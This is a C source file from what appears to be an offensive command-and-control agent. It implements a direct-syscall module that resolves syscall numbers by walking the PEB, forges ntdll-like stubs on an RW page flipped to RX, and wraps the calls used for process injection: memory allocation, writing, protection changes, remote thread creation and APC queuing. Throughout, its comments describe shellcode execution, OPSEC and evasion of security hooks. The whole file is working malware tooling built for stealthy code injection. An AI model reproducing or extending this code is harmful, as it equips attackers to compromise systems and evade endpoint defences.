/*
 * syscall_mask.c — HERO direct-syscall wrapper (production C2 integration)
 *
 * DESIGN PHILOSOPHY (isolation principle):
 *   This module is COMPLETELY SEPARATE from Shadow7 (sleep mask).
 *   - No shared state with PhantomCtx
 *   - No shared DR registers (DR0-DR3 belong to Shadow7/AMSI/ETW)
 *   - No VEH handler (stack spoof alone is sufficient)
 *   - Fail-safe: if init fails, agent falls back to normal Win32 path
 *
 * WHAT THIS MODULE DOES:
 *   4 high-risk syscalls are routed through HERO FORGE forged stubs:
 *     NtAllocateVirtualMemory  (memory alloc — injection step 1)
 *     NtProtectVirtualMemory   (RX permission — shellcode execute)
 *     NtWriteVirtualMemory     (payload write — injection step 2)
 *     NtCreateThreadEx         (thread injection — execution)
 *
 *   All other syscalls use normal Win32 path — minimal surface area.
 *
 * OPSEC PROPERTIES:
 *   - RW alloc → RX flip (never RWX) — BOF loader v7 same pattern
 *   - SSN resolved at runtime via PEB walk (Hell's Gate + Halo fallback)
 *   - Forged stubs indistinguishable from ntdll stubs anatomically
 *   - No static SSN table — adapts to any Windows version automatically
 *   - Graceful degradation: if HERO init fails, sm_ready=0, callers
 *     receive NULL and fall back to VirtualAllocEx / WriteProcessMemory
 */

#include "hero_peb_walking.h"
#include <windows.h>

/* ── BUILD COMPAT (GCC 14+ / mingw-w64) ──────────────────────────────
 * STATUS_UNSUCCESSFUL (0xC0000001) is defined in <ntstatus.h> on the
 * Windows SDK, but mingw-w64's <ntstatus.h> redefines many NTSTATUS
 * codes that <windows.h> already pulls in via <winnt.h>, causing macro
 * redefinition errors. To keep <windows.h> as the only include and stay
 * portable across mingw versions, we define STATUS_UNSUCCESSFUL locally
 * if the macro is not yet visible. The value matches Microsoft's
 * NTSTATUS specification verbatim — do not change.
 * ─────────────────────────────────────────────────────────────────── */
#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

/* ---- internal state --------------------------------------------------- */

static int            sm_ready  = 0;   /* 0 = not init / fallback mode    */
static uint8_t*       sm_page   = NULL; /* RX forge page (9 stubs × 32B)  */
static HsFn           sm_fns[HS_MAX_FNS];
static int            sm_fn_count = 0;

/* Stub slot indices (fixed layout on the forge page).
 * OPSEC FIX (audit I-M7): added 5 more high-risk syscalls to the mask.
 * First 4 are REQUIRED — if any SSN can't be resolved, sm_init returns 0
 * (fallback mode). The 5 new ones are OPTIONAL — if their SSN can't be
 * resolved (e.g., not exported on older Windows), the wrapper just returns
 * STATUS_UNSUCCESSFUL and the caller falls back to the Win32 path.
 * This way, adding the 5 new syscalls can NEVER break the existing 4. */
enum {
    SM_SLOT_ALLOC     = 0,   /* NtAllocateVirtualMemory  (required) */
    SM_SLOT_PROT      = 1,   /* NtProtectVirtualMemory   (required) */
    SM_SLOT_WRITE     = 2,   /* NtWriteVirtualMemory     (required) */
    SM_SLOT_THREAD    = 3,   /* NtCreateThreadEx         (required) */
    SM_SLOT_READ      = 4,   /* NtReadVirtualMemory      (optional) */
    SM_SLOT_SETINFO   = 5,   /* NtSetInformationThread    (optional) */
    SM_SLOT_QUERYINFO = 6,   /* NtQueryInformationProcess(optional) */
    SM_SLOT_CLOSE     = 7,   /* NtClose                   (optional) */
    SM_SLOT_QUEUEAPC  = 8,   /* NtQueueApcThread          (optional) */
    SM_SLOT_COUNT     = 9
};

#define SM_REQUIRED_COUNT 4  /* first 4 must resolve or sm_init fails */

static const char* SM_NAMES[SM_SLOT_COUNT] = {
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    "NtReadVirtualMemory",
    "NtSetInformationThread",
    "NtQueryInformationProcess",
    "NtClose",
    "NtQueueApcThread",
};

/* Resolved SSNs (set during init) */
static int32_t sm_ssn[SM_SLOT_COUNT];

/* ---- typedefs for the 4 syscalls -------------------------------------- */

typedef NTSTATUS (NTAPI *PfnNtAlloc)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS (NTAPI *PfnNtProt)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS (NTAPI *PfnNtWrite)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS (NTAPI *PfnNtCreateThread)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

/* OPSEC FIX (audit I-M7): typedefs for the 5 new optional syscalls */
typedef NTSTATUS (NTAPI *PfnNtRead)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS (NTAPI *PfnNtSetInfoThread)(
    HANDLE, ULONG, PVOID, ULONG);

typedef NTSTATUS (NTAPI *PfnNtQueryInfoProc)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *PfnNtClose)(HANDLE);

typedef NTSTATUS (NTAPI *PfnNtQueueApcThread)(
    HANDLE, PVOID, PVOID, PVOID, PVOID);

/* ---- helpers ---------------------------------------------------------- */

static int32_t sm_lookup_ssn(const char* name) {
    int i;
    for (i = 0; i < sm_fn_count; i++) {
        if (sm_fns[i].ssn >= 0 && strcmp(sm_fns[i].name, name) == 0)
            return sm_fns[i].ssn;
    }
    return -1;
}

static void* sm_stub_va(int slot) {
    if (!sm_page || slot < 0 || slot >= SM_SLOT_COUNT) return NULL;
    return sm_page + (size_t)slot * HS_STUB_LEN;
}

/* ---- public API ------------------------------------------------------- */

/*
 * sm_init() — called ONCE during agent startup (after Shadow7 init).
 *
 * Uses 2 clean vendor ntdll stubs (alloc + protect) to bootstrap the
 * forge page (RW alloc → write stubs → RX flip), then never calls ntdll
 * again for the 4 masked syscalls.
 *
 * Returns: 1 = ready, 0 = fallback mode (safe — callers check sm_ready)
 */
int sm_init(void) {
    HsModule mods[4];
    HsExportStats es;
    HsStubStats   ss;
    HsResolveStats rs;
    int nm, n, i;
    const HsFn *alloc_fn, *prot_fn;

    sm_ready = 0;
    sm_page  = NULL;

    /* Phase 1: locate ntdll via PEB */
    nm = hs_find_ntdll_modules(mods, 4);
    if (nm <= 0) return 0;

    /* Phase 2-4: parse exports, decode stubs, resolve SSNs */
    n = hs_parse_exports(mods[0].base, mods[0].size,
                         sm_fns, HS_MAX_FNS, &es);
    if (n <= 0) return 0;
    sm_fn_count = n;

    hs_sort_by_rva(sm_fns, n);
    hs_decode_stubs(sm_fns, n, mods[0].base, mods[0].size, &ss);
    hs_resolve_all(sm_fns, n, mods[0].base, mods[0].size, &rs);

    /* Resolve SSNs — first SM_REQUIRED_COUNT are mandatory, rest optional.
     * OPSEC FIX (audit I-M7): the 5 new syscalls (READ, SETINFO, QUERYINFO,
     * CLOSE, QUEUEAPC) are optional. If any can't be resolved (not exported
     * on this Windows version), sm_ssn[i] stays -1 and the wrapper returns
     * STATUS_UNSUCCESSFUL. The 4 required syscalls MUST resolve or we fall
     * back to Win32 path for all of them (safe degradation). */
    for (i = 0; i < SM_SLOT_COUNT; i++) {
        sm_ssn[i] = sm_lookup_ssn(SM_NAMES[i]);
        if (i < SM_REQUIRED_COUNT && sm_ssn[i] < 0) return 0; /* required miss */
        /* optional miss (i >= 4): sm_ssn[i] = -1, wrapper will return error */
    }

    /* Bootstrap: find clean alloc + protect stubs for the 2 vendor calls */
    alloc_fn = NULL; prot_fn = NULL;
    for (i = 0; i < n; i++) {
        if (sm_fns[i].status == HS_STUB_CLEAN && sm_fns[i].ssn >= 0) {
            if (!alloc_fn && strcmp(sm_fns[i].name, "NtAllocateVirtualMemory") == 0)
                alloc_fn = &sm_fns[i];
            if (!prot_fn  && strcmp(sm_fns[i].name, "NtProtectVirtualMemory") == 0)
                prot_fn = &sm_fns[i];
        }
    }
    if (!alloc_fn || !prot_fn) return 0;
    if (!hs_bootstrap_ok(alloc_fn, prot_fn)) return 0;

    /* Alloc RW forge page via CLEAN vendor stub (only ntdll call we make) */
    {
        PfnNtAlloc va = (PfnNtAlloc)(void*)(mods[0].base + alloc_fn->rva);
        void*  pg  = NULL;
        SIZE_T psz = 0x1000;
        NTSTATUS s = va((HANDLE)-1, &pg, 0, &psz,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (s != 0 || !pg) return 0;
        sm_page = (uint8_t*)pg;
    }

    /* Write forged stubs (RW phase).
     * Skip optional syscalls that couldn't be resolved (SSN = -1) — their
     * slot on the forge page stays zeroed (from the RW alloc), and the
     * wrapper checks sm_ssn[slot] before calling, so a zeroed slot is never
     * executed. */
    for (i = 0; i < SM_SLOT_COUNT; i++) {
        if (sm_ssn[i] < 0) continue;  /* skip optional syscalls not found */
        uint8_t stub[HS_STUB_LEN];
        if (hs_forge_stub(stub, sm_ssn[i]) != 0) {
            /* wipe partial page — leave in fallback mode */
            VirtualFree(sm_page, 0, MEM_RELEASE);
            sm_page = NULL;
            return 0;
        }
        memcpy(sm_page + (size_t)i * HS_STUB_LEN, stub, HS_STUB_LEN);
    }

    /* RW → RX flip (never RWX — same pattern as BOF loader v7) */
    {
        PfnNtProt vp = (PfnNtProt)(void*)(mods[0].base + prot_fn->rva);
        void*  pb = sm_page;
        SIZE_T ps = 0x1000;
        ULONG  op = 0;
        NTSTATUS s = vp((HANDLE)-1, &pb, &ps, PAGE_EXECUTE_READ, &op);
        if (s != 0) {
            VirtualFree(sm_page, 0, MEM_RELEASE);
            sm_page = NULL;
            return 0;
        }
    }

    sm_ready = 1;
    return 1;
}

/*
 * sm_is_ready() — check before using any sm_* wrapper.
 * If 0, caller should use normal Win32 API.
 */
int sm_is_ready(void) {
    return sm_ready;
}

/*
 * sm_cleanup() — free forge page (call on agent shutdown).
 */
void sm_cleanup(void) {
    if (sm_page) {
        VirtualFree(sm_page, 0, MEM_RELEASE);
        sm_page = NULL;
    }
    sm_ready = 0;
    sm_fn_count = 0;
}

/*
 * The 4 forged-stub wrappers.
 * Each returns the NTSTATUS from the forged stub directly.
 * Callers must check sm_is_ready() before using these.
 */

NTSTATUS sm_NtAllocateVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG   AllocationType,
    ULONG   Protect)
{
    PfnNtAlloc f = (PfnNtAlloc)sm_stub_va(SM_SLOT_ALLOC);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(ProcessHandle, BaseAddress, ZeroBits, RegionSize,
             AllocationType, Protect);
}

NTSTATUS sm_NtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect)
{
    PfnNtProt f = (PfnNtProt)sm_stub_va(SM_SLOT_PROT);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}

NTSTATUS sm_NtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    PfnNtWrite f = (PfnNtWrite)sm_stub_va(SM_SLOT_WRITE);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(ProcessHandle, BaseAddress, Buffer,
             NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS sm_NtCreateThreadEx(
    PHANDLE     ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID       ObjectAttributes,
    HANDLE      ProcessHandle,
    PVOID       StartRoutine,
    PVOID       Argument,
    ULONG       CreateFlags,
    SIZE_T      ZeroBits,
    SIZE_T      StackSize,
    SIZE_T      MaximumStackSize,
    PVOID       AttributeList)
{
    PfnNtCreateThread f = (PfnNtCreateThread)sm_stub_va(SM_SLOT_THREAD);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
             StartRoutine, Argument, CreateFlags, ZeroBits,
             StackSize, MaximumStackSize, AttributeList);
}

/* ── OPSEC FIX (audit I-M7): 5 new optional syscall wrappers ───────────
 * Each checks sm_ssn[slot] >= 0 before calling. If the SSN couldn't be
 * resolved at init (not exported on this Windows version), the wrapper
 * returns STATUS_UNSUCCESSFUL and the caller falls back to Win32 path.
 * This ensures the 5 new syscalls can NEVER break the agent — they're
 * purely additive, opt-in via sm_is_ready() check. */

NTSTATUS sm_NtReadVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  Size,
    PSIZE_T NumberOfBytesRead)
{
    if (sm_ssn[SM_SLOT_READ] < 0) return STATUS_UNSUCCESSFUL;
    PfnNtRead f = (PfnNtRead)sm_stub_va(SM_SLOT_READ);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(ProcessHandle, BaseAddress, Buffer, Size, NumberOfBytesRead);
}

NTSTATUS sm_NtSetInformationThread(
    HANDLE  ThreadHandle,
    ULONG   ThreadInformationClass,
    PVOID   ThreadInformation,
    ULONG   ThreadInformationLength)
{
    if (sm_ssn[SM_SLOT_SETINFO] < 0) return STATUS_UNSUCCESSFUL;
    PfnNtSetInfoThread f = (PfnNtSetInfoThread)sm_stub_va(SM_SLOT_SETINFO);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(ThreadHandle, ThreadInformationClass, ThreadInformation, ThreadInformationLength);
}

NTSTATUS sm_NtQueryInformationProcess(
    HANDLE  ProcessHandle,
    ULONG   ProcessInformationClass,
    PVOID   ProcessInformation,
    ULONG   ProcessInformationLength,
    PULONG  ReturnLength)
{
    if (sm_ssn[SM_SLOT_QUERYINFO] < 0) return STATUS_UNSUCCESSFUL;
    PfnNtQueryInfoProc f = (PfnNtQueryInfoProc)sm_stub_va(SM_SLOT_QUERYINFO);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(ProcessHandle, ProcessInformationClass, ProcessInformation,
             ProcessInformationLength, ReturnLength);
}

NTSTATUS sm_NtClose(HANDLE Handle)
{
    if (sm_ssn[SM_SLOT_CLOSE] < 0) return STATUS_UNSUCCESSFUL;
    PfnNtClose f = (PfnNtClose)sm_stub_va(SM_SLOT_CLOSE);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(Handle);
}

NTSTATUS sm_NtQueueApcThread(
    HANDLE          ThreadHandle,
    PVOID           ApcRoutine,
    PVOID           ApcArgument1,
    PVOID           ApcArgument2,
    PVOID           ApcArgument3)
{
    if (sm_ssn[SM_SLOT_QUEUEAPC] < 0) return STATUS_UNSUCCESSFUL;
    PfnNtQueueApcThread f = (PfnNtQueueApcThread)sm_stub_va(SM_SLOT_QUEUEAPC);
    if (!f) return STATUS_UNSUCCESSFUL;
    return f(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3);
}
